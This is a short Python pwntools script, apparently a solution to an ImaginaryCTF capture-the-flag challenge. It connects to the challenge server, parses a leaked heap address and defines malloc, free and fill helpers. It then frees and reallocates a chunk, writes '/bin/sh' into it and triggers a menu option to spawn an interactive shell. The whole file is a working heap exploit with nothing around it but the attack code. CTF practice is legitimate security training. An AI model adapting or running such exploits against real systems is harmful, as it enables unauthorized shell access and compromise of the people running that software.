from pwn import *
p=remote('chal.imaginaryctf.org',42003)
#p=process('./file')
#raw_input("DEBUG")
p.recvuntil('b is at ')
b = int(p.recv(14),16)
print "B: ",hex(b)


def malloc(x):#1:a 2:b
	p.sendlineafter('> ',"1")
	p.sendlineafter('>> ',str(x))

def free(x):#1:a 2:b
	p.sendlineafter('> ',"2")
	p.sendlineafter('>> ',str(x))

def fill(a):
	p.sendlineafter('> ',"3")
	p.sendline(str(a))



free(1)
malloc(2)
fill("/bin/sh\x00")

p.sendlineafter('> ',"4")


p.interactive()